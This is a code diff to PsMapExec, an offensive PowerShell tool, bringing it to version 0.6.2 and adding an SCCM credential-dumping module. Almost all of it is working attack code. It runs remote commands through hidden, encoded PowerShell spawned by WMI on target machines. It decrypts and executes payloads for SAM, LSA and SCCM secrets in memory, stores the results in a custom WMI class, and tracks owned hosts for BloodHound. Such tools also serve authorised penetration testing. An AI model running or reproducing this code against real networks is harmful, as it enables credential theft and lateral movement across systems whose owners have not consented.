@@ -239,7 +239,7 @@ Documentation: https://viperone.gitbook.io/pentest-everything/psmapexec
                                                                  
 
 Github  : https://github.com/The-Viper-One
-Version : 0.6.0")
+Version : 0.6.2")
 
     if (!$NoBanner) {
         Write-Output $Banner
@@ -283,13 +283,13 @@ Version : 0.6.0")
     $IPMI = Join-Path $PME "IPMI"
     $RDP = Join-Path $PME "RDP"
     $BloodHound = Join-Path $PME "BloodHound"
-    $Scripts = Join-Path $PME "Scripts"
+    $SCCM = Join-Path $PME "SCCM"
 
     $directories = @(
         $PME, $SAM, $LogonPasswords, $MSSQL, $SMB, $Tickets, $ekeys, 
         $LSA, $ConsoleHistory, $Sessions, 
         $UserFiles, $Spraying, $VNC, $NTDS, $Kerberoast, $IPMI, $RDP, $BloodHound,
-        $Scripts
+        $SCCM
     )
 
     foreach ($directory in $directories) {
@@ -353,11 +353,11 @@ Version : 0.6.0")
 
     if ($DomainJoined) {
         if ($NoBanner) { Write-Output "" }
-        Write-Output "Domain  : Yes"
+        #Write-Output "Domain  : Yes"
     }
     elseif (!$DomainJoined) {
         if ($NoBanner) { Write-Output "" }
-        Write-Output "Domain  : No"
+        #Write-Output "Domain  : No"
         Inform-Inject
         if ($Global:SkipRestoreTicket -eq $null) { $Global:SkipRestoreTicket = $false }
     }
@@ -497,6 +497,7 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
             "LSA" {}
             "NTDS" {}
             "SAM" {}
+            "SCCM" {}
             "Test" {}
             "Tickets" {}
 
@@ -506,7 +507,7 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                 Write-Host "[*] " -ForegroundColor Yellow -NoNewline
                 Write-Host "Invalid Module specified"
                 Write-Host "[*] " -ForegroundColor Yellow -NoNewline
-                Write-Host "Specify either: Files, ConsoleHistory, KerbDump, eKeys, LogonPasswords, LSA, NTDS, SAM, Amnesiac"
+                Write-Host "Specify either: Files, ConsoleHistory, KerbDump, eKeys, LogonPasswords, LSA, NTDS, SAM, Amnesiac or SCCM"
                 return
             }
         }
@@ -2036,6 +2037,7 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
         "ConsoleHistory" = "Console History output will be written to $ConsoleHistory"
         "Files"          = "File output will be written to $UserFiles"
         "NTDS"           = "NTDS output will be written to $NTDS"
+        "SCCM"           = "SCCM output will be written to $SCCM"
     }
 
     if ($moduleMessages.ContainsKey($Module)) {
@@ -2124,7 +2126,7 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
         $key = Generate-RandomString 32
         $iv = Generate-RandomString 16  
         $n = AESEnc -k $key -iv $iv -t "$Pandemonium"
-        $Command = "try {$Arbiter} Catch{}  ; $Decrypt ;  AESDec $key $iv $n | IEX ; Invoke-Pandemonium -command ""dump"""
+        $Command = "try {$Arbiter} Catch{}  ; $Decrypt ;  AESDec $key $iv $n | IEX ; Invoke-Pandemonium -command ""dump"" ; Write-output ""`[SYSTEM]:`$env:computername"""
     }
 
     # eKeys
@@ -2158,13 +2160,20 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
         
     }
 
+    elseif ($Module -eq "SCCM") {
+        $key = Generate-RandomString 32
+        $iv = Generate-RandomString 16  
+        $n = AESEnc -k $key -iv $iv -t "$LocalSCCM"
+        $Command = "try {$Arbiter} Catch{}  ; $Decrypt ;  AESDec $key $iv $n | IEX "
+    }
+
     # SAM
     elseif ($Module -eq "sam") {
         
         $key = Generate-RandomString 32
         $iv = Generate-RandomString 16  
         $n = AESEnc -k $key -iv $iv -t "$LocalSAM"
-        $Command = "try {$Arbiter} Catch{} ; $Decrypt ;  AESDec $key $iv $n | IEX"
+        $Command = "try {$Arbiter} Catch{}  ; $Decrypt ;  AESDec $key $iv $n | IEX"
     }
 
     # Disks
@@ -2266,7 +2275,7 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
             $tcpClient.Close()
             if (!$connected) { return "Unable to connect" }
 
-            # Function to perform WMI operations
+
             Function WMI {
                 param (
                     [string]$ComputerName,
@@ -2283,12 +2292,11 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                     $LocalPassword = ConvertTo-SecureString "$Password" -AsPlainText -Force
                     $cred = New-Object System.Management.Automation.PSCredential($LocalUsername, $LocalPassword)
                 }
-    
+
                 $WMIAccess = $null
-                if ($LocalAuth) { $WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" -Credential $Cred } 
+                if ($LocalAuth) { $WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" -Credential $cred } 
                 else { $WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" }
-    
-    
+
                 if (!$WMIAccess) { return "Access Denied" } 
                 elseif ($Command -eq "") { return "Successful Connection PME" }
 
@@ -2299,17 +2307,15 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
 
                     if ($LocalAuth) { $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $cred }
                     else { $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" }
-        
-        
+
                     if ($classCheck -eq $null) {
                         if ($LocalAuth) {
                             $scope = New-Object System.Management.ManagementScope("\\$ComputerName\root\cimv2", (New-Object System.Management.ConnectionOptions -Property @{ Username = "$Computername\$Username"; Password = $Password }))
                             $scope.Connect()
                             $newClass = New-Object System.Management.ManagementClass($scope, [System.Management.ManagementPath]::DefaultPath, $null)
                         }
-
                         else { $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2", [string]::Empty, $null) }
-            
+
                         $newClass["__CLASS"] = "$Class"
                         $newClass.Qualifiers.Add("Static", $true)
                         $newClass.Properties.Add("InstanceID", [System.Management.CimType]::String, $false)
@@ -2318,10 +2324,10 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                         $newClass.Properties.Add("CommandToRun", [System.Management.CimType]::String, $false)
                         $newClass.Put() | Out-Null
                     }
-        
-                    if ($LocalAuth) { $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName -Credential $Cred }
+
+                    if ($LocalAuth) { $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName -Credential $cred }
                     else { $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName }
-        
+
                     $wmiInstance.GetType() | Out-Null
                     $wmiInstance.CommandToRun = "$Command"
                     $wmiInstance.Put() | Out-Null
@@ -2330,7 +2336,6 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                     return $InstanceID
                 }
 
-
                 # Function to retrieve script output
                 function GetScriptOutput {
                     param (
@@ -2338,12 +2343,13 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                         [string]$InstanceID
                     )
                     try {
-            
-                        if ($LocalAuth) { $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "InstanceID = '$InstanceID'" -Credential $Cred }
+                        if ($LocalAuth) { $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "InstanceID = '$InstanceID'" -Credential $cred }
                         else { $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "InstanceID = '$InstanceID'" }
             
-                        $result = $wmiInstance.CommandOutput
+                        $encodedResult = $wmiInstance.CommandOutput
                         $wmiInstance.Dispose()
+                        $resultBytes = [Convert]::FromBase64String($encodedResult)
+                        $result = [System.Text.Encoding]::UTF8.GetString($resultBytes)
                         return $result
                     }
                     catch {
@@ -2362,12 +2368,12 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                         [string]$ComputerName,
                         [string]$Command
                     )
-        
-                    $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -Enc " + $Command      
-        
-                    if ($LocalAuth) { $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $Cred }
+
+                    $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command      
+
+                    if ($LocalAuth) { $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $cred }
                     else { $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine }
-        
+
                     if ($process.ReturnValue -eq 0) {
                         $started = Get-Date
                         Do {
@@ -2375,9 +2381,9 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                                 Write-Host "PID: $($process.ProcessId) - Response took too long."
                                 break
                             }
-                
+    
                             $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
-                
+    
                             Start-Sleep -Seconds 1
                         } While ($watcher -ne $null)
                         $scriptOutput = GetScriptOutput -ComputerName $ComputerName -InstanceID $scriptInstanceID
@@ -2385,26 +2391,33 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                     }
                 }
 
-    
                 $scriptInstanceID = Invoke-Class -ComputerName $ComputerName
                 if ($scriptInstanceID -eq $null) { return "Error Creating Class" }
-                $encodedCommand = "`$commandToRun = (Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`").CommandToRun; `$result = Invoke-Command -ScriptBlock { `$commandToRun | IEX } | Out-String; Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
-                $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
+
+                $script = @"
+`$commandToRun = (Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`").CommandToRun
+`$result = Invoke-Command -ScriptBlock { `$commandToRun | IEX } | Out-String
+`$result = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$result))
+Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null
+"@
+
+                $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script))
                 $result = Invoke-Execution -ComputerName $ComputerName -Command $encodedCommand
 
-
                 try {
-                    start-sleep -seconds 1
+                    Start-Sleep -Seconds 1
 
-                    if ($LocalAuth) { Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName -Credential $Cred | Out-Null }
+                    if ($LocalAuth) { Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName -Credential $cred | Out-Null }
                     else { Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null }
-        
-                    $Cleanup = "Success"
 
+                    $Cleanup = "Success"
                 }
                 Catch { $Cleanup = "Failure" }
                 return @($result, $Cleanup, $Class)
             }
+
+
+
 
             If ($LocalAuth) { WMI -ComputerName $ComputerName -Command $Command -LocalAuth -Username $Username -Password $Password }
             else { WMI -ComputerName $ComputerName  -Command $Command }
@@ -2436,6 +2449,8 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
         }
 
         # Poll the runspaces and display results as they complete
+        [int]$Global:SuccessCount = 0
+
         do {
             foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
         
@@ -2477,20 +2492,29 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
                         continue
                     } 
+
+                    elseif ($result -like "*Object reference not set to an instance of an object.*" -and $Module -eq "SCCM") {
+                        if ($successOnly) { continue }
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NOT SCCM CLIENT" -NameLength $NameLength -OSLength $OSLength
+                        Continue
+                    }
                          
                     elseif ($result -eq "Successful Connection PME") {
+                        $Global:SuccessCount ++
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
                     } 
 
                     elseif ($result -match "[a-zA-Z0-9]") {
-                
+                    
                         if ($result -eq "No Results") {
                             if ($successOnly) { continue }
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                         } 
                         else {
+                            
+                            $Global:SuccessCount ++
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
@@ -2505,6 +2529,7 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                                 "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                                 "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                                 "NTDS" { "$NTDS\$($runspace.ComputerName)-NTDS.txt" }
+                                "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                 default { $null }
                             }
 
@@ -2527,6 +2552,7 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                         }
                     } 
                     elseif ($result -notmatch "[a-zA-Z0-9]") {
+                        $Global:SuccessCount ++
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS " -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
@@ -2541,10 +2567,8 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
             Start-Sleep -Milliseconds 100
         } while ($runspaces | Where-Object { -not $_.Completed })
 
-        # Clean up
         $runspacePool.Close()
         $runspacePool.Dispose()
-
     }
 
     ################################################################################################################
@@ -2780,7 +2804,9 @@ while (`$true) {
                 })
         }
 
-        # Poll the runspaces and display results as they complete
+        
+        [int]$Global:SuccessCount = 0
+
         do {
             foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
         
@@ -2812,9 +2838,16 @@ while (`$true) {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
                         continue
-                    } 
+                    }
+
+                    elseif ($result -like "*Object reference not set to an instance of an object.*" -and $Module -eq "SCCM") {
+                        if ($successOnly) { continue }
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NOT SCCM CLIENT" -NameLength $NameLength -OSLength $OSLength
+                        Continue
+                    }
              
                     elseif ($result -eq "Successful Connection PME") {
+                        $Global:SuccessCount ++
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
@@ -2826,10 +2859,12 @@ while (`$true) {
                 
                         if ($result -eq "No Results") {
                             if ($successOnly) { continue }
+                            $Global:SuccessCount ++
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                         }
                  
                         else {
+                            $Global:SuccessCount ++
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
@@ -2844,6 +2879,7 @@ while (`$true) {
                                 "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                                 "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                                 "NTDS" { "$NTDS\$($runspace.ComputerName)-NTDS.txt" }
+                                "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                 default { $null }
                             }
 
@@ -2866,6 +2902,7 @@ while (`$true) {
                         }
                     } 
                     elseif ($result -notmatch "[a-zA-Z0-9]") {
+                        $Global:SuccessCount ++
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
@@ -2880,7 +2917,6 @@ while (`$true) {
             Start-Sleep -Milliseconds 100
         } while ($runspaces | Where-Object { -not $_.Completed })
 
-        # Clean up
         $runspacePool.Close()
         $runspacePool.Dispose()
 
@@ -3010,6 +3046,10 @@ while (`$true) {
                     return "cannot find the computer"
                 }
 
+                elseif ($_.Exception.Message -like "*Object reference not set to an instance of an object.*") {
+                    return "Object reference not set to an instance of an object."
+                }
+
                 else {
                     return "Unspecified Error"
                 }
@@ -3042,7 +3082,8 @@ while (`$true) {
                 })
         }
 
-        # Poll the runspaces and display results as they complete
+        [int]$Global:SuccessCount = 0
+
         do {
             foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
         
@@ -3056,7 +3097,8 @@ while (`$true) {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                         continue
-                    } 
+                    }
+                     
                     elseif ($result -eq "Unspecified Error") {
                         if ($successOnly) { continue }
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
@@ -3088,8 +3130,15 @@ while (`$true) {
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
                         continue
                     }
+
+                    elseif ($result -like "*Object reference not set to an instance of an object.*" -and $Module -eq "SCCM") {
+                        if ($successOnly) { continue }
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NOT SCCM CLIENT" -NameLength $NameLength -OSLength $OSLength
+                        Continue
+                    }
              
                     elseif ($result -eq "Successful Connection PME") {
+                        $Global:SuccessCount ++
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
@@ -3101,9 +3150,11 @@ while (`$true) {
                 
                         if ($result -eq "No Results") {
                             if ($successOnly) { continue }
+                            $Global:SuccessCount ++
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                         } 
                         else {
+                            $Global:SuccessCount ++
                             Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                             Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
@@ -3118,6 +3169,7 @@ while (`$true) {
                                 "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                                 "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                                 "NTDS" { "$NTDS\$($runspace.ComputerName)-NTDS.txt" }
+                                "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                 default { $null }
                             }
 
@@ -3140,6 +3192,7 @@ while (`$true) {
                         }
                     } 
                     elseif ($result -notmatch "[a-zA-Z0-9]") {
+                        $Global:SuccessCount ++
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -ComputerOwned
                         Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain -UserName $Username -AdminToProperty
@@ -3154,7 +3207,6 @@ while (`$true) {
             Start-Sleep -Milliseconds 100
         } while ($runspaces | Where-Object { -not $_.Completed })
 
-        # Clean up
         $runspacePool.Close()
         $runspacePool.Dispose()
 
@@ -3378,6 +3430,7 @@ while (`$true) {
 
 
 
+                [int]$Global:SuccessCount = 0
                 if ($LocalAuth) { $Domain = $ComputerName }
                 if ($Password -ne "") { $result = Invoke-RDP "username=$Domain\$Username password=$Password computername=$ComputerName" }
            
@@ -3392,6 +3445,7 @@ while (`$true) {
                     "Unable to connect" { continue }
 
                     { $SuccessStatus -contains $_ } {
+                        $SuccessCount ++
                         Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                         if ($LocalAuth) { $Username = "$Username (Local Account)" }
                         if (-not (Test-Path -Path "$RDP\$Username.txt")) { New-Item -Path "$RDP\$Username.txt" -ItemType "File" -Force | Out-Null }
@@ -3417,6 +3471,7 @@ while (`$true) {
                     }
 
                     { $ToDStatus -contains $_ } {
+                        $SuccessCount ++
                         Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS - ACCOUNT RESTRICTION" -NameLength $NameLength -OSLength $OSLength
                         if ($LocalAuth) { $Username = "$Username (Local Account)" }
                         if (-not (Test-Path -Path "$RDP\$Username.txt")) { New-Item -Path "$RDP\$Username.txt" -ItemType "File" -Force | Out-Null }
@@ -3682,7 +3737,7 @@ while (`$true) {
                 })
         }
 
-        # Poll the runspaces and display results as they complete
+        [int]$Global:SuccessCount = 0
         do {
             foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
                 if ($runspace.Handle.IsCompleted) {
@@ -3709,6 +3764,7 @@ while (`$true) {
                     }
 
                     elseif ($result -match "Signing not Required") {
+                        $Global:SuccessCount ++
                         Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SMB Signing not Required" -NameLength $NameLength -OSLength $OSLength
                         $($runspace.ComputerName) | Out-File "$SMB\SigningNotRequired-$Domain.txt" -Encoding "ASCII" -Append -Force -ErrorAction "SilentlyContinue"
                         continue
@@ -3734,7 +3790,6 @@ while (`$true) {
             $Unique | Set-Content "$SMB\SigningNotRequired-$Domain.txt" -Force
         } 
 
-        # Clean up
         $runspacePool.Close()
         $runspacePool.Dispose()
  
@@ -3796,12 +3851,11 @@ while (`$true) {
                     $LocalPassword = ConvertTo-SecureString "$Password" -AsPlainText -Force
                     $cred = New-Object System.Management.Automation.PSCredential($LocalUsername, $LocalPassword)
                 }
-    
+
                 $WMIAccess = $null
-                if ($LocalAuth) { $WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" -Credential $Cred } 
+                if ($LocalAuth) { $WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" -Credential $cred } 
                 else { $WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" }
-    
-    
+
                 if (!$WMIAccess) { return "Access Denied" } 
                 elseif ($Command -eq "") { return "Successful Connection PME" }
 
@@ -3812,17 +3866,15 @@ while (`$true) {
 
                     if ($LocalAuth) { $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $cred }
                     else { $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" }
-        
-        
+
                     if ($classCheck -eq $null) {
                         if ($LocalAuth) {
                             $scope = New-Object System.Management.ManagementScope("\\$ComputerName\root\cimv2", (New-Object System.Management.ConnectionOptions -Property @{ Username = "$Computername\$Username"; Password = $Password }))
                             $scope.Connect()
                             $newClass = New-Object System.Management.ManagementClass($scope, [System.Management.ManagementPath]::DefaultPath, $null)
                         }
-
                         else { $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2", [string]::Empty, $null) }
-            
+
                         $newClass["__CLASS"] = "$Class"
                         $newClass.Qualifiers.Add("Static", $true)
                         $newClass.Properties.Add("InstanceID", [System.Management.CimType]::String, $false)
@@ -3831,10 +3883,10 @@ while (`$true) {
                         $newClass.Properties.Add("CommandToRun", [System.Management.CimType]::String, $false)
                         $newClass.Put() | Out-Null
                     }
-        
-                    if ($LocalAuth) { $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName -Credential $Cred }
+
+                    if ($LocalAuth) { $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName -Credential $cred }
                     else { $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName }
-        
+
                     $wmiInstance.GetType() | Out-Null
                     $wmiInstance.CommandToRun = "$Command"
                     $wmiInstance.Put() | Out-Null
@@ -3843,7 +3895,6 @@ while (`$true) {
                     return $InstanceID
                 }
 
-
                 # Function to retrieve script output
                 function GetScriptOutput {
                     param (
@@ -3851,12 +3902,13 @@ while (`$true) {
                         [string]$InstanceID
                     )
                     try {
-            
-                        if ($LocalAuth) { $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "InstanceID = '$InstanceID'" -Credential $Cred }
+                        if ($LocalAuth) { $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "InstanceID = '$InstanceID'" -Credential $cred }
                         else { $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "InstanceID = '$InstanceID'" }
             
-                        $result = $wmiInstance.CommandOutput
+                        $encodedResult = $wmiInstance.CommandOutput
                         $wmiInstance.Dispose()
+                        $resultBytes = [Convert]::FromBase64String($encodedResult)
+                        $result = [System.Text.Encoding]::UTF8.GetString($resultBytes)
                         return $result
                     }
                     catch {
@@ -3875,12 +3927,12 @@ while (`$true) {
                         [string]$ComputerName,
                         [string]$Command
                     )
-        
-                    $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -Enc " + $Command      
-        
-                    if ($LocalAuth) { $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $Cred }
+
+                    $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command      
+
+                    if ($LocalAuth) { $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $cred }
                     else { $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine }
-        
+
                     if ($process.ReturnValue -eq 0) {
                         $started = Get-Date
                         Do {
@@ -3888,9 +3940,9 @@ while (`$true) {
                                 Write-Host "PID: $($process.ProcessId) - Response took too long."
                                 break
                             }
-                
+    
                             $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
-                
+    
                             Start-Sleep -Seconds 1
                         } While ($watcher -ne $null)
                         $scriptOutput = GetScriptOutput -ComputerName $ComputerName -InstanceID $scriptInstanceID
@@ -3898,25 +3950,29 @@ while (`$true) {
                     }
                 }
 
-    
                 $scriptInstanceID = Invoke-Class -ComputerName $ComputerName
                 if ($scriptInstanceID -eq $null) { return "Error Creating Class" }
